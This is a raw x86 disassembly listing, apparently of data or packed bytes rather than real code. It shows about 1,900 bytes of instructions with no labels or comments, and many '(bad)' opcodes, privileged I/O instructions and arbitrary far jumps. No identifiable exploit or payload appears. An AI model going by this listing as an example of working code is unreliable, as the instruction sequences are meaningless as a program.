  41d08d:	push   eax
  41d08e:	retf   
  41d08f:	xor    esp,DWORD PTR [bp+si+0xca4]
  41d094:	icebp  
  41d095:	mov    cl,0xc1
  41d097:	cmc    
  41d098:	lahf   
  41d099:	lods   eax,DWORD PTR ds:[esi]
  41d09a:	stc    
  41d09b:	cli    
  41d09c:	cmc    
  41d09d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d09e:	dec    ebx
  41d09f:	adc    al,0xf2
  41d0a1:	adc    BYTE PTR [edi],bl
  41d0a3:	shr    BYTE PTR [eax],0x2d
  41d0a6:	push   ebp
  41d0a7:	mov    ecx,0xa71691bf
  41d0ac:	aam    0x5
  41d0ae:	xor    bl,cl
  41d0b0:	rcr    BYTE PTR [esi],0xf5
  41d0b3:	sbb    al,0x47
  41d0b5:	cld    
  41d0b6:	adc    DWORD PTR [ebp+esi*4-0x2c90f36d],ebp
  41d0bd:	jne    0x41d076
  41d0bf:	scas   eax,DWORD PTR es:[edi]
  41d0c0:	jmp    0x41d0e5
  41d0c2:	dec    DWORD PTR [edx]
  41d0c4:	fwait
  41d0c5:	add    al,0x88
  41d0c7:	shr    edx,0xbb
  41d0ca:	inc    eax
  41d0cb:	add    eax,0xb0f3e5c9
  41d0d0:	push   ds
  41d0d1:	(bad)  
  41d0d2:	mov    al,ds:0xb1a08c0c
  41d0d7:	mov    ecx,0xd0f3fdaa
  41d0dc:	aas    
  41d0dd:	add    DWORD PTR [ecx+eax*1+0x7c],0x49
  41d0e2:	and    al,0x5d
  41d0e4:	shr    DWORD PTR [edx-0x51],0xfa
  41d0e8:	xchg   edx,eax
  41d0e9:	loope  0x41d0ab
  41d0eb:	or     bh,BYTE PTR [edx]
  41d0ed:	mov    al,ds:0x2e89f9a0
  41d0f2:	int3   
  41d0f3:	test   eax,0x2c9292fd
  41d0f8:	add    esi,edx
  41d0fa:	add    esp,DWORD PTR [edx+0x4]
  41d0fd:	mov    bh,0x17
  41d0ff:	cmp    BYTE PTR [edx-0x5],0xfe
  41d103:	out    dx,eax
  41d104:	arpl   WORD PTR [eax*1-0xeeebe00],di
  41d10b:	stc    
  41d10c:	loopne 0x41d185
  41d10e:	adc    al,0x22
  41d110:	push   0x2f409797
  41d115:	mov    ah,0x8d
  41d117:	sbb    DWORD PTR [edi],eax
  41d119:	cmp    BYTE PTR [ecx],cl
  41d11b:	data16 movs BYTE PTR es:[edi],BYTE PTR es:[esi]
  41d11e:	pop    ds
  41d11f:	xchg   BYTE PTR [ebp-0x7518e055],bl
  41d125:	aad    0xa8
  41d127:	scas   eax,DWORD PTR es:[edi]
  41d128:	mov    esi,0x90ac8319
  41d12d:	jnp    0x41d146
  41d12f:	and    al,0xef
  41d131:	dec    eax
  41d132:	add    ebp,ebp
  41d134:	push   ebx
  41d135:	hlt    
  41d136:	xor    eax,0xe4611e77
  41d13b:	xor    eax,0x364f6300
  41d140:	inc    ebp
  41d141:	sub    al,0x10
  41d143:	fnstenv [edi-0x4d]
  41d146:	add    ch,BYTE PTR [ecx-0x2f]
  41d149:	mov    al,bl
  41d14b:	nop
  41d14c:	fnclex 
  41d14e:	mov    bh,0x58
  41d150:	mov    esi,0x7da6a8d3
  41d155:	mov    al,0x2f
  41d157:	aam    0x50
  41d159:	cld    
  41d15a:	in     al,0x20
  41d15c:	inc    esp
  41d15d:	add    DWORD PTR [esi+0x17],eax
  41d160:	dec    ebx
  41d161:	xor    DWORD PTR [ebx],edx
  41d163:	aam    0x46
  41d165:	aam    0x7b
  41d167:	jecxz  0x41d19b
  41d169:	sti    
  41d16a:	ret    
  41d16b:	cmc    
  41d16c:	push   ebx
  41d16d:	(bad)
  41d170:	dec    ebx
  41d171:	call   0x9f87180f
  41d176:	jne    0x41d133
  41d178:	mov    ds:0xbe9ffc5b,al
  41d17d:	jl     0x41d1ea
  41d17f:	xor    eax,0x1b63df73
  41d184:	scas   al,BYTE PTR es:[edi]
  41d185:	xor    bl,ah
  41d187:	test   DWORD PTR [ecx+0x241429a2],ebx
  41d18d:	xor    DWORD PTR [eax],eax
  41d18f:	cmc    
  41d190:	rcl    esp,cl
  41d192:	test   bh,0xc3
  41d195:	or     DWORD PTR [edi],0x4d
  41d198:	and    edi,DWORD PTR [ebp-0x4f]
  41d19b:	xor    esi,DWORD PTR [esi-0x4a2a81f2]
  41d1a1:	and    esi,ebx
  41d1a3:	xor    dh,BYTE PTR [esi+0x2e]
  41d1a6:	cmp    al,0xd3
  41d1a8:	icebp  
  41d1a9:	inc    ebx
  41d1aa:	out    0xf4,al
  41d1ac:	fcomp  DWORD PTR [edi]
  41d1ae:	bound  edx,QWORD PTR [edx-0x338509e4]
  41d1b4:	mov    ebp,0x743138a6
  41d1b9:	jb     0x41d1a5
  41d1bb:	push   ss
  41d1bc:	call   0x7dd452b2
  41d1c1:	xchg   ebp,eax
  41d1c2:	repz mov ch,0xf
  41d1c5:	xadd   dl,dl
  41d1c8:	pmaddwd mm5,mm6
  41d1cb:	les    edi,FWORD PTR [edx]
  41d1cd:	cmp    DWORD PTR [esi],edx
  41d1cf:	sub    BYTE PTR [eax-0x43],0x83
  41d1d3:	retf   
  41d1d4:	inc    edi
  41d1d5:	gs inc edi
  41d1d7:	call   0xb099d2c1
  41d1dc:	mov    ds:0x232aec99,al
  41d1e1:	sahf   
  41d1e2:	adc    ch,BYTE PTR [edi+eax*1]
  41d1e5:	outs   dx,DWORD PTR ds:[esi]
  41d1e6:	adc    BYTE PTR [ebp-0x122771a3],dl
  41d1ec:	nop
  41d1ed:	sti    
  41d1ee:	les    esi,FWORD PTR [edi-0x2d]
  41d1f1:	fisubr WORD PTR [ebp-0x68]
  41d1f4:	and    DWORD PTR [ecx+0x71b4d283],ebp
  41d1fa:	fistp  QWORD PTR [eax+0x30882237]
  41d200:	cmp    eax,0xf5a6ee7e
  41d205:	inc    edx
  41d206:	repz mov ?,WORD PTR [ebp+0x3c]
  41d20a:	fcomp  QWORD PTR [eax-0x4e5e1091]
  41d210:	sub    BYTE PTR [edx],bh
  41d212:	mov    ecx,0xb1cd5ce8
  41d217:	add    al,0x1f
  41d219:	cmp    ch,BYTE PTR [edi]
  41d21b:	retf   0x1544
  41d21e:	sbb    DWORD PTR [edi+0x543c8157],ebp
  41d224:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d225:	ins    BYTE PTR es:[edi],dx
  41d226:	out    dx,eax
  41d227:	lea    edi,[ecx-0x48]
  41d22a:	mov    bh,0x11
  41d22c:	mov    ecx,0xfc3515d6
  41d231:	clc    
  41d232:	push   DWORD PTR ds:0xb6896a7
  41d238:	jmp    0x6f8d73cd
  41d23d:	dec    esp
  41d23e:	pop    ecx
  41d23f:	cmp    cl,BYTE PTR [edx+esi*2-0x51]
  41d243:	stc    
  41d244:	pushf  
  41d245:	rcl    DWORD PTR [ebx+0xfb202a4],cl
  41d24b:	cld    
  41d24c:	mov    al,ds:0x1a0834ce
  41d251:	dec    ecx
  41d252:	push   0x4dad6a95
  41d257:	rcl    BYTE PTR [ebx-0x11],1
  41d25a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d25b:	fs cmp esi,ebx
  41d25e:	adc    DWORD PTR [ebp-0x74ef378e],ebp
  41d264:	in     eax,0x6a
  41d266:	mov    al,ch
  41d268:	adc    DWORD PTR [edx+edi*4],edi
  41d26b:	mov    WORD PTR es:[edx],cs
  41d26e:	dec    esi
  41d26f:	sbb    BYTE PTR [edi+0x2d],bl
  41d272:	dec    ecx
  41d273:	shr    DWORD PTR [edx+0x4a63e5cd],0xf9
  41d27a:	test   al,0x57
  41d27c:	sub    DWORD PTR [ecx-0x6135a113],edi
  41d282:	clc    
  41d283:	je     0x41d2db
  41d285:	xchg   cl,ah
  41d287:	fsub   DWORD PTR [ecx+0x37]
  41d28a:	mov    ebp,0xd35616e8
  41d28f:	(bad)  
  41d290:	imul   BYTE PTR [ebp-0x57]
  41d293:	sbb    eax,0xf7b9ab82
  41d298:	or     dl,BYTE PTR [ebx+ebx*4]
  41d29b:	adc    al,dl
  41d29d:	jl     0x41d248
  41d29f:	push   edi
  41d2a0:	sub    dh,BYTE PTR [ecx+0x39]
  41d2a3:	push   esi
  41d2a4:	add    eax,0xae4a5c8c
  41d2a9:	repnz mov al,ds:0xce9e3a3b
  41d2af:	xchg   esp,eax
  41d2b0:	jp     0x41d2e9
  41d2b2:	int    0x23
  41d2b4:	mov    dh,0xfe
  41d2b6:	les    ebx,FWORD PTR [eax-0x42]
  41d2b9:	ret    
  41d2ba:	fs test al,0xf9
  41d2bd:	sub    ecx,DWORD PTR [ebp+0x4ced33d3]
  41d2c3:	xchg   ebp,eax
  41d2c4:	rcr    DWORD PTR [ecx-0x20],0xa
  41d2c8:	mov    eax,ds:0xca339a50
  41d2cd:	ror    BYTE PTR fs:[edx+0xd],cl
  41d2d1:	dec    ebp
  41d2d2:	mov    bh,0xb1
  41d2d4:	xor    bh,BYTE PTR ds:0x95cfa359
  41d2da:	and    bl,al
  41d2dc:	jp     0x41d277
  41d2de:	ret    
  41d2df:	jne    0x41d2a4
  41d2e1:	ret    0xe587
  41d2e4:	ficomp DWORD PTR [ecx]
  41d2e6:	int    0x95
  41d2e8:	cld    
  41d2e9:	icebp  
  41d2ea:	int    0x1d
  41d2ec:	adc    DWORD PTR [ebx+0x5e],ecx
  41d2ef:	jae    0x41d2a2
  41d2f1:	sbb    cl,BYTE PTR ds:0xa07b1836
  41d2f7:	mov    dh,0xc0
  41d2f9:	or     BYTE PTR [edi+eax*4],0x47
  41d2fd:	mov    eax,0x525c49fe
  41d302:	dec    ecx
  41d303:	bnd jnp 0x41d298
  41d306:	jmp    0x3630a1b8
  41d30b:	icebp  
  41d30c:	inc    eax
  41d30d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d30e:	shr    DWORD PTR [edx],1
  41d310:	inc    esi
  41d311:	fisttp QWORD PTR [edi-0x6c8ed71b]
  41d317:	mov    al,ds:0x43e3de6b
  41d31c:	push   ebx
  41d31d:	xchg   BYTE PTR [esp+ecx*4+0x34d18a77],bh
  41d324:	mov    ds:0x61174a19,al
  41d329:	cmp    BYTE PTR [edx-0x7e28a4e8],cl
  41d32f:	in     al,dx
  41d330:	mov    ds:0x5597f686,al
  41d335:	sub    BYTE PTR [edx+edi*2-0x80],bh
  41d339:	mov    ss,WORD PTR [eax-0xf]
  41d33c:	mov    edi,0xab665534
  41d341:	and    al,BYTE PTR [ebx-0x65]
  41d344:	mov    ecx,0xf78144fd
  41d349:	mov    BYTE PTR [edx+ebx*1-0x4d],dh
  41d34d:	jo     0x41d35a
  41d34f:	xchg   DWORD PTR [ebx+0x4c9c33c],ebp
  41d355:	dec    esi
  41d356:	add    DWORD PTR [edx+edi*2],edi
  41d359:	sbb    dl,dl
  41d35b:	mov    al,0x1d
  41d35d:	mov    al,0x17
  41d35f:	(bad)  
  41d360:	push   esi
  41d361:	inc    ebp
  41d362:	fmul   QWORD PTR [edi]
  41d364:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d365:	test   al,0x98
  41d367:	push   0xd904faf0
  41d36c:	mov    DWORD PTR [eax],ecx
  41d36e:	nop
  41d36f:	mov    ss,eax
  41d371:	call   0xff5f2f27
  41d376:	repz jecxz 0x41d36f
  41d379:	ficomp WORD PTR [ebp-0x2cd964f5]
  41d37f:	mov    eax,ds:0x570342b0
  41d384:	out    0xe8,eax
  41d386:	pop    edx
  41d387:	mov    bl,0xc9
  41d389:	cmp    eax,0xd079946c
  41d38e:	int    0xb4
  41d390:	clc    
  41d391:	dec    ecx
  41d392:	es cld 
  41d394:	ins    DWORD PTR es:[edi],dx
  41d395:	mov    bl,BYTE PTR [ecx-0x30]
  41d398:	dec    ebx
  41d399:	ds xchg ebp,eax
  41d39b:	sbb    ebp,edx
  41d39d:	aad    0x47
  41d39f:	daa    
  41d3a0:	(bad)  
  41d3a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d3a2:	mov    eax,cs:0xa94c733f
  41d3a8:	jecxz  0x41d347
  41d3aa:	add    eax,0x92a29a06
  41d3af:	in     al,dx
  41d3b0:	jb     0x41d429
  41d3b2:	test   ch,al
  41d3b4:	inc    ebx
  41d3b5:	pop    eax
  41d3b6:	and    BYTE PTR [ebp-0x53b587d0],bl
  41d3bc:	dec    eax
  41d3bd:	ds stc 
  41d3bf:	dec    ebx
  41d3c0:	inc    edx
  41d3c1:	mov    ecx,0xdd1d5bd7
  41d3c6:	lods   eax,DWORD PTR ds:[esi]
  41d3c7:	fldenv [eax+0x7445888]
  41d3cd:	mov    ebp,0xd54e581c
  41d3d2:	mov    ebx,0xe33c20fc
  41d3d7:	add    DWORD PTR ds:0xf569cf6e,edi
  41d3dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d3de:	pop    ecx
  41d3df:	adc    dh,BYTE PTR [eax-0x352e0e6c]
  41d3e5:	imul   esp,edi,0x36
  41d3e8:	ror    BYTE PTR [edx+0x6b],0x7f
  41d3ec:	jb     0x41d399
  41d3ee:	sub    ah,cl
  41d3f0:	and    BYTE PTR [ebp-0x7],dh
  41d3f3:	cdq    
  41d3f4:	pop    ecx
  41d3f5:	mov    eax,ds:0x4e51a52e
  41d3fa:	mov    al,ds:0xe5fe7f19
  41d3ff:	and    dl,ch
  41d401:	call   0x4f78:0x118130
  41d408:	jo     0x41d3bf
  41d40a:	rcl    DWORD PTR [edi],cl
  41d40c:	fidiv  WORD PTR ds:0x64870de0
  41d412:	jne    0x41d41e
  41d414:	mov    ebx,0x1e9c797a
  41d419:	pop    edx
  41d41a:	and    eax,0x7a025c48
  41d41f:	pop    eax
  41d420:	xor    bh,al
  41d422:	sbb    DWORD PTR [edx+0x3d],esp
  41d425:	sub    dh,bl
  41d427:	aad    0xba
  41d429:	jbe    0x41d3b8
  41d42b:	fs jne 0x41d404
  41d42e:	add    DWORD PTR [esi+eax*1-0x45],esi
  41d432:	jmp    0x94f5:0xd83d4ad
  41d439:	sahf   
  41d43a:	jae    0x41d4b2
  41d43c:	scas   al,BYTE PTR es:[edi]
  41d43d:	lock sub ecx,ebx
  41d440:	shr    DWORD PTR [ecx-0x4],1
  41d443:	dec    ebx
  41d444:	xor    BYTE PTR [eax],bh
  41d446:	out    0x81,eax
  41d448:	adc    bh,cl
  41d44a:	xor    DWORD PTR [ebx],esi
  41d44c:	out    0x61,eax
  41d44e:	dec    ebx
  41d44f:	scas   eax,DWORD PTR es:[edi]
  41d450:	loop   0x41d3e6
  41d452:	leave  
  41d453:	neg    BYTE PTR [ebp+0x770e1870]
  41d459:	sub    al,0x16
  41d45b:	xor    al,0x28
  41d45d:	je     0x41d40c
  41d45f:	xchg   edi,eax
  41d460:	inc    edx
  41d461:	mov    edi,edi
  41d463:	and    eax,DWORD PTR [ebp+0x362151d5]
  41d469:	les    ebx,FWORD PTR [eax+0x388d6d8c]
  41d46f:	repnz std 
  41d471:	push   cs
  41d472:	jg     0x41d3f6
  41d474:	ret    
  41d475:	sub    dl,cl
  41d477:	(bad)  
  41d478:	sar    BYTE PTR [eax+ebx*8+0xe],1
  41d47c:	and    ch,BYTE PTR [edx+0x50]
  41d47f:	fisub  WORD PTR [esi]
  41d481:	mov    cl,0x11
  41d483:	pusha  
  41d484:	sbb    dl,BYTE PTR [ebx+0x34]
  41d487:	lods   eax,DWORD PTR ds:[esi]
  41d488:	push   edx
  41d489:	div    DWORD PTR [esi]
  41d48b:	sti    
  41d48c:	and    ebx,edx
  41d48e:	inc    edx
  41d48f:	ja     0x41d4e1
  41d491:	add    dh,bl
  41d493:	fdivrp st(6),st
  41d495:	retf   0xe88e
  41d498:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d499:	add    ah,BYTE PTR [ebx-0x4d]
  41d49c:	in     al,dx
  41d49d:	test   BYTE PTR [ecx+edi*2],dh
  41d4a0:	dec    eax
  41d4a1:	mov    dh,0x26
  41d4a3:	and    ebx,esp
  41d4a5:	sub    ah,BYTE PTR [ebp+esi*4+0x2b]
  41d4a9:	xor    cl,dh
  41d4ab:	push   esi
  41d4ac:	jo     0x41d473
  41d4ae:	dec    ebx
  41d4af:	mov    bl,0x3a
  41d4b1:	ja     0x41d4b5
  41d4b3:	jp     0x41d52f
  41d4b5:	push   ecx
  41d4b6:	out    0x38,eax
  41d4b8:	rcr    BYTE PTR fs:[ebx+0x595bff13],0x76
  41d4c0:	icebp  
  41d4c1:	jnp    0x41d511
  41d4c3:	(bad)  
  41d4c4:	frstor [ebx]
  41d4c6:	repz retf 
  41d4c8:	sub    BYTE PTR [ebp+0x4850815e],al
  41d4ce:	dec    esi
  41d4cf:	xor    eax,edx
  41d4d1:	stc    
  41d4d2:	adc    al,0x43
  41d4d4:	inc    esi
  41d4d5:	leave  
  41d4d6:	int3   
  41d4d7:	jmp    0x2415:0xa1247fff
  41d4de:	mov    BYTE PTR [ebp+0x74c92f5d],ch
  41d4e4:	out    dx,al
  41d4e5:	dec    ecx
  41d4e6:	pop    edi
  41d4e7:	add    BYTE PTR [ecx-0x7907500a],al
  41d4ed:	loop   0x41d47a
  41d4ef:	mov    bh,0x69
  41d4f1:	rol    BYTE PTR [ebx],0xc9
  41d4f4:	and    edi,esi
  41d4f6:	mov    al,ds:0xdbb71f80
  41d4fb:	lods   eax,DWORD PTR ds:[esi]
  41d4fc:	xchg   edi,eax
  41d4fd:	mov    edi,0x6289fea3
  41d502:	aam    0x95
  41d504:	pop    esi
  41d505:	fs addr16 jae 0x41d582
  41d509:	mov    ah,0x6a
  41d50b:	jno    0x41d4cb
  41d50d:	inc    edi
  41d50e:	ins    DWORD PTR es:[edi],dx
  41d50f:	addr16 das 
  41d511:	cmp    ah,BYTE PTR [ecx]
  41d513:	inc    esp
  41d514:	xchg   esp,eax
  41d515:	leave  
  41d516:	idiv   BYTE PTR [ebp-0xcf517ec]
  41d51c:	xor    DWORD PTR [esi+eax*1+0x7a9a60e2],edx
  41d523:	push   ds
  41d524:	xlat   BYTE PTR ds:[ebx]
  41d525:	push   ebp
  41d526:	jb     0x41d554
  41d528:	mov    eax,0x2453c817
  41d52d:	ja     0x41d4e1
  41d52f:	or     al,0x11
  41d531:	(bad)  
  41d532:	dec    ebp
  41d533:	mov    eax,0x2e0cf6a0
  41d538:	jmp    0x41d4c4
  41d53a:	xor    al,0x6b
  41d53c:	inc    esp
  41d53d:	adc    eax,DWORD PTR [ebp-0x2297fa4e]
  41d543:	fcomp  QWORD PTR [edx+0x42]
  41d546:	in     al,0x6f
  41d548:	(bad)  
  41d549:	or     al,0x5f
  41d54b:	sbb    BYTE PTR [ecx+0x77],bh
  41d54e:	or     ah,BYTE PTR [ebx]
  41d550:	ins    DWORD PTR es:[edi],dx
  41d551:	add    ah,ch
  41d553:	mov    ch,BYTE PTR [edx]
  41d555:	and    al,0x9f
  41d557:	pop    ebx
  41d558:	xor    ch,BYTE PTR [eax]
  41d55a:	in     eax,0x91
  41d55c:	ins    BYTE PTR es:[edi],dx
  41d55d:	loope  0x41d51a
  41d55f:	retf   
  41d560:	sub    al,0xd6
  41d562:	lods   eax,DWORD PTR ds:[esi]
  41d563:	or     BYTE PTR [eax],ah
  41d565:	pop    ecx
  41d566:	push   ecx
  41d567:	xchg   ebp,eax
  41d568:	mov    ds:0xf5fc8a6d,al
  41d56d:	xor    ecx,DWORD PTR [edi+eiz*8+0x51]
  41d571:	lahf   
  41d572:	mov    bl,0x5d
  41d574:	jne    0x41d571
  41d576:	(bad)  
  41d577:	pop    edi
  41d578:	cmp    BYTE PTR [ebp-0x7ca6edb2],bh
  41d57e:	repnz pop ebx
  41d580:	push   DWORD PTR ds:0x814e735f
  41d586:	loopne 0x41d50a
  41d588:	outs   dx,DWORD PTR ds:[esi]
  41d589:	pusha  
  41d58a:	and    DWORD PTR [eax-0x17],edx
  41d58d:	inc    edx
  41d58e:	xchg   BYTE PTR [edx],bl
  41d590:	sbb    bh,BYTE PTR [eax+0x1dd16f42]
  41d596:	lods   al,BYTE PTR ds:[esi]
  41d597:	bound  ebp,QWORD PTR [ecx-0x20]
  41d59a:	loopne 0x41d5f0
  41d59c:	std    
  41d59d:	sub    edi,DWORD PTR [esi+0x5b]
  41d5a0:	add    eax,0xfd4dbb98
  41d5a5:	push   esi
  41d5a6:	nop
  41d5a7:	xchg   DWORD PTR [edi-0x7e],eax
  41d5aa:	and    al,0x47
  41d5ac:	sbb    al,BYTE PTR [ecx]
  41d5ae:	rcl    BYTE PTR [edx+0x40],cl
  41d5b1:	or     eax,0x4a73021c
  41d5b6:	shl    BYTE PTR [ebx+0x10],1
  41d5b9:	jge    0x41d564
  41d5bb:	mov    bh,0xc8
  41d5bd:	push   es
  41d5be:	xor    DWORD PTR [edx],eax
  41d5c0:	or     ebp,0x985dba70
  41d5c6:	retf   0x5544
  41d5c9:	push   ss
  41d5ca:	cs xor al,0xcc
  41d5cd:	push   edi
  41d5ce:	cmc    
  41d5cf:	js     0x41d61d
  41d5d1:	in     eax,0x57
  41d5d3:	dec    edx
  41d5d4:	add    al,0xc1
  41d5d6:	inc    ebp
  41d5d7:	into   
  41d5d8:	ins    DWORD PTR es:[edi],dx
  41d5d9:	sub    al,ah
  41d5db:	sbb    BYTE PTR [eax+esi*8-0x7037149b],dl
  41d5e2:	(bad)  
  41d5e3:	(bad)  
  41d5e4:	jge    0x41d577
  41d5e6:	inc    ebx
  41d5e7:	inc    ecx
  41d5e8:	pushf  
  41d5e9:	in     eax,0x35
  41d5eb:	dec    esp
  41d5ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5ed:	hlt    
  41d5ee:	dec    ebp
  41d5ef:	daa    
  41d5f0:	dec    edi
  41d5f1:	xor    bl,cl
  41d5f3:	jmp    0x41d63a
  41d5f5:	xor    esi,esp
  41d5f7:	jge    0x41d63a
  41d5f9:	leave  
  41d5fa:	adc    DWORD PTR [ecx+0x2d],ecx
  41d5fd:	sahf   
  41d5fe:	shl    BYTE PTR [eax+edx*1-0x594cd17d],1
  41d605:	imul   ebp,DWORD PTR [ebp-0x2],0xffffff93
  41d609:	mov    ds:0x1db498de,al
  41d60e:	pop    edi
  41d60f:	jne    0x41d638
  41d611:	mov    edi,0x8860b01d
  41d616:	sub    bl,dh
  41d618:	jb     0x41d603
  41d61a:	xchg   edx,eax
  41d61b:	shl    edx,0xb0
  41d61e:	aaa    
  41d61f:	popf   
  41d620:	pop    edi
  41d621:	xchg   ecx,eax
  41d622:	loope  0x41d5c8
  41d624:	mov    dl,0xc9
  41d626:	neg    BYTE PTR [ebx+0x6b2c54d8]
  41d62c:	mov    eax,cs:0xd2dbfe3d
  41d632:	cmp    BYTE PTR ss:0xe3aba3a5,bh
  41d639:	mov    esp,0x5e3c836a
  41d63e:	pop    edx
  41d63f:	mov    ecx,DWORD PTR [ebx+esi*2+0x35]
  41d643:	cli    
  41d644:	int3   
  41d645:	or     al,BYTE PTR [ebx]
  41d647:	jge    0x41d618
  41d649:	fsub   DWORD PTR [ebx-0x3a]
  41d64c:	(bad)  
  41d64d:	arpl   WORD PTR [edi-0x28eecfbe],sp
  41d653:	ret    0xdebc
  41d656:	dec    ecx
  41d657:	push   eax
  41d658:	loopne 0x41d68b
  41d65a:	or     al,0x76
  41d65c:	push   cs
  41d65d:	pop    edi
  41d65e:	xchg   ebp,eax
  41d65f:	jae    0x41d64f
  41d661:	xchg   BYTE PTR [ebx+0x6d3e2f35],ah
  41d667:	(bad)  
  41d668:	data16 aas 
  41d66a:	ins    DWORD PTR es:[edi],dx
  41d66b:	mov    dl,0xdc
  41d66d:	call   0x4564fd26
  41d672:	push   es
  41d673:	in     eax,dx
  41d674:	addr16 cld 
  41d676:	adc    bl,al
  41d678:	sub    BYTE PTR [ebp+0xae09fa4],ch
  41d67e:	push   esi
  41d67f:	jo     0x41d677
  41d681:	popa   
  41d682:	addr16 inc ecx
  41d684:	mov    bl,0x40
  41d686:	pop    es
  41d687:	mov    eax,ds:0xd6144779
  41d68c:	adc    BYTE PTR [edx-0x47ffa562],dh
  41d692:	push   ds
  41d693:	jae    0x41d691
  41d695:	adc    dh,BYTE PTR [ecx]
  41d697:	das    
  41d698:	(bad)  
  41d699:	popf   
  41d69a:	cdq    
  41d69b:	push   ebx
  41d69c:	int3   
  41d69d:	pop    eax
  41d69e:	dec    esi
  41d69f:	add    BYTE PTR [eax+0x40450d8d],0x75
  41d6a6:	test   BYTE PTR [eax+edi*8+0x10b88080],ah
  41d6ad:	ja     0x41d640
  41d6af:	xor    esi,DWORD PTR [edi-0x23c62af3]
  41d6b5:	ins    DWORD PTR es:[edi],dx
  41d6b6:	inc    esi
  41d6b7:	mov    ecx,0x7bbcd3e3
  41d6bc:	add    DWORD PTR [edi-0x26],edi
  41d6bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d6c0:	mov    ebp,0x6f4ae577
  41d6c5:	jo     0x41d71b
  41d6c7:	and    DWORD PTR [eax+0x6d368df3],edx
  41d6cd:	daa    
  41d6ce:	test   eax,0x47a3367c
  41d6d3:	out    0x92,al
  41d6d5:	mov    ds:0xaeffd982,eax
  41d6da:	and    al,0x16
  41d6dc:	xor    eax,DWORD PTR [edi]
  41d6de:	fist   WORD PTR [edx]
  41d6e0:	out    0x62,al
  41d6e2:	fsubr  QWORD PTR [ecx-0x4d]
  41d6e5:	aaa    
  41d6e6:	xor    al,0x23
  41d6e8:	sbb    DWORD PTR [ebx],esi
  41d6ea:	push   edx
  41d6eb:	pop    edi
  41d6ec:	inc    eax
  41d6ed:	imul   eax,DWORD PTR [edx-0x28],0xdad6a71f
  41d6f4:	cmp    ah,dh
  41d6f6:	je     0x41d6a1
  41d6f8:	dec    ebp
  41d6f9:	xchg   esp,eax
  41d6fa:	bound  edi,QWORD PTR [esi-0x1d62bc05]
  41d700:	inc    ecx
  41d701:	sub    DWORD PTR [esi],ebx
  41d703:	jbe    0x41d70e
  41d705:	out    dx,eax
  41d706:	data16 lahf 
  41d708:	repz sub al,0x39
  41d70b:	adc    ebx,DWORD PTR [eax-0x1f]
  41d70e:	push   cs
  41d70f:	pop    ebp
  41d710:	sub    ebx,DWORD PTR [eax]
  41d712:	pop    edi
  41d713:	fisttp DWORD PTR [edi]
  41d715:	jo     0x41d69c
  41d717:	(bad)  
  41d719:	and    BYTE PTR [esp+edx*2-0x23],ah
  41d71d:	inc    edi
  41d71e:	sahf   
  41d71f:	or     edi,ebx
  41d721:	shr    al,1
  41d723:	iret   
  41d724:	enter  0x4697,0xd5
  41d728:	in     al,dx
  41d729:	(bad)  
  41d72a:	lods   al,BYTE PTR ds:[esi]
  41d72b:	cmp    eax,0xc762549e
  41d730:	fdiv   DWORD PTR [edi]
  41d732:	fisubr DWORD PTR [edx+ebp*1-0x23c7bd1f]
  41d739:	push   eax
  41d73a:	arpl   WORD PTR [esi],bp
  41d73c:	cld    
  41d73d:	adc    eax,0xa27a40e3
  41d742:	adc    ebp,DWORD PTR [ecx-0x6]
  41d745:	sub    DWORD PTR ds:0x7209e123,edx
  41d74b:	bswap  esi
  41d74d:	dec    edi
  41d74e:	or     al,0x87
  41d750:	add    esi,DWORD PTR [eax-0x23867e6a]
  41d756:	xor    DWORD PTR [esi-0xe],ebp
  41d759:	mov    ch,0xfc
  41d75b:	xchg   DWORD PTR [ebp+0x497804b8],edx
  41d761:	pop    eax
  41d762:	mov    edx,0x668c34e4
  41d767:	add    eax,0x552b9129
  41d76c:	jmp    0xd885:0x422c5a2f
  41d773:	loop   0x41d755
  41d775:	rcr    eax,0xba
  41d778:	repz or DWORD PTR [edx],edi
  41d77b:	mov    dl,0xd8
  41d77d:	sti    
  41d77e:	mov    dl,BYTE PTR [edx]
  41d780:	dec    ebp
  41d781:	hlt    
  41d782:	fsubr  QWORD PTR [ebx]
  41d784:	pushf  
  41d785:	test   BYTE PTR [ebx+edx*8-0x3909bcbf],dh
  41d78c:	inc    ebp
  41d78d:	jle    0x41d77b
  41d78f:	sub    dl,BYTE PTR [si]
  41d792:	mov    edx,0x70dc3f31
  41d797:	leave  
  41d798:	sub    ah,0x95
  41d79b:	push   ds
  41d79c:	aad    0x90
  41d79e:	popf   
  41d79f:	xor    ecx,DWORD PTR [ecx+0x43]
  41d7a2:	jne    0x41d774
  41d7a4:	retf   
  41d7a5:	pusha  
  41d7a6:	sahf   
  41d7a7:	mov    eax,ds:0x1f8c9f9f
  41d7ac:	push   edx
  41d7ad:	lods   eax,DWORD PTR ds:[esi]
  41d7ae:	sub    BYTE PTR [eax-0x3fa301c2],cl
  41d7b4:	adc    eax,DWORD PTR [ebx+0x4acaf77]
  41d7ba:	mov    es,WORD PTR [edi-0x40]
  41d7bd:	xor    BYTE PTR [ebx],dh
  41d7bf:	lds    ebp,FWORD PTR [ecx+0x1f104033]
  41d7c5:	jne    0x41d7e4
  41d7c7:	add    cl,dl
  41d7c9:	and    DWORD PTR [esi+0x3b15e270],esi
  41d7cf:	lods   eax,DWORD PTR ds:[esi]
  41d7d0:	or     DWORD PTR ss:[ebp+0x3d191ebd],0xffffffe9
  41d7d8:	lahf   
  41d7d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d7da:	mov    edx,0xdf9e640c
  41d7df:	cmp    cl,BYTE PTR [ebp-0x11]
  41d7e2:	jno    0x41d83e
  41d7e4:	dec    esi
  41d7e5:	push   ebx
  41d7e6:	adc    cl,dh
  41d7e8:	xor    al,0xbf
  41d7ea:	repnz or ecx,DWORD PTR [ebx-0x80]
  41d7ee:	mov    esi,0x627e7e56
  41d7f3:	adc    DWORD PTR [ecx+0x5cbaec2b],ebp
  41d7f9:	push   ecx
  41d7fa:	popf   
  41d7fb:	gs push ebp
